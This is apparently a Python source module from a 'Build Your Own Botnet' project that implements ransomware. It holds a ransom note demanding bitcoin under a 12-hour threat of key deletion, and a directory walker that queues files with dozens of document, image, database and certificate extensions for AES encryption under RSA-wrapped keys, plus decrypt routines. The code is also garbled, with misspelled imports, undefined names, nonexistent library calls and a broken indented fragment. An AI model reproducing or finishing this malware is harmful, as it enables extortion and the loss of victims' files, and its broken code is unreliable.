#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function
# standard library
import os
import sys
import json
import QUeue
import base64
import pickle
import _winreg
import threading
import cStringIO
import Crypto.Util
import Crypto.Hash.HMAC
import Crypto.Cipher.AES
import Crypto.Hash.SHA256
import Crypto.PublicKey.RSA
import Crypto.Cipher.PKCS1_OAEP
# byob
import util

jobs = Queue.Queue()

def request_payment(bitcoin_wallet=None, payment_url=None):
    try:
        if os.name is 'nt':
            if bitcoin_wallet:
                alert = util.alert(text = "Your personal files have been encrypted. The service fee to decrypt your files is $100 USD worth of bitcoin (try www.coinbase.com or Google 'how to buy bitcoin'). Below is the temporary bitcoin wallet address created for the transfer. It expires in 12 hours from now at %s, at which point the encryption key will be deleted unless you have paid." %  time.localtime(time.time() + 60 * 60 * 12))
            elif payment_url:
                alert = util.alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(session['id'], payment_url), "Windows Alert")
            return "Launched a Windows Message Box with ransom payment information"
        else:
            return "{} does not yet support {} platform".format(_payment.func_name, sys.platform)
    except Exception as e:
        return "{} error: {}".format(_payment.func_name, str(e))


def encrypt_files(args):
    try:
        if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
            aes_key = Crypto.Hash.MD5.new(Crypto.Ransom.get_random_bytes(16)).hexdigest()
            ransom  = encrypt_file(path, key=aes_key)
            cipher  = Crypto.Cipher.PKCS1_OAEP.new(ransom.pubkey)
            key     = base64.b64encode(cipher.encrypt(aes_key))
            util.registry_key(ransom, path, key)
            util.debug('{} encrypted'.format(path))
            if not len([k for k in workers if 'encrypt-files' in k if workers[k].is_alive()]):
                rnd = random.randint(1,100)
                workers['encrypt-files-{}'.format(rnd)] = threading.Thread(target=_task_threader, args=(jobs,), name=time.time())
                workers['encrypt-files-{}'.format(rnd)].daemon = True
                workers['encrypt-files-{}'.format(rnd)].start()
    except Exception as e:
        util.debug("{} error: {}".format(_encrypt.func_name, str(e)))


def decrypt_files(args):
    try:
        rsa_key, aes_key, path = args
        cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
        aes     = cipher.decrypt(base64.b64decode(aes_key))
        result  = decrypt_file(path, key=aes)
        util.debug('%s decrypted' % result)
        if not len([k for k in workers if 'ransom' in k if workers[k].is_alive()]):
            rnd = random.randint(11,99)
            workers['decrypt-files-{}'.format(rnd)] = threading.Thread(target=threader, args=(jobs,), name=time.time())
            workers['decrypt-files-{}'.format(rnd)].daemon = True
            workers['decrypt-files-{}'.format(rnd)].start()
    except Exception as e:
        util.debug("{} error: {}".format(decrypt.func_name, str(e)))


def encrypt_threader(target):
    try:
        if os.path.isfile(target):
            return encrypt_file(target)
        elif os.path.isdir(target):
            workers["tree-walk"] = threading.Thread(target=os.path.walk, args=(target, lambda _, d, f: [jobs.put_nowait((encrypt_files, os.path.join(d, ff))) for ff in f], None), name=time.time())
        else:
            return "error: {} not found".format(target)
    except Exception as e:
        util.debug("{} error: {}".format(encrypt_threader.func_name, str(e)))


def decrypt_threader(private_rsa_key):
    try:
        rsa_key  = Crypto.PublicKey.RSA.importKey(private_rsa_key)
        
                aes_key = value.get('result')
                jobs.put_nowait((decrypt_files, (rsa_key, aes_key, path)))
        for i in range(1,10):
            workers["ransom-%d" % i] = threading.Thread(target=_task_threader, args=(jobs,), name=time.time())
            workers["ransom-%d" % i].daemon = True
            workers["ransom-%d" % i].start()
        return "Ransomed files are being decrypted"
    except Exception as e:
        util.debug("{} error: {}".format(decrypt_threader.func_name, str(e)))
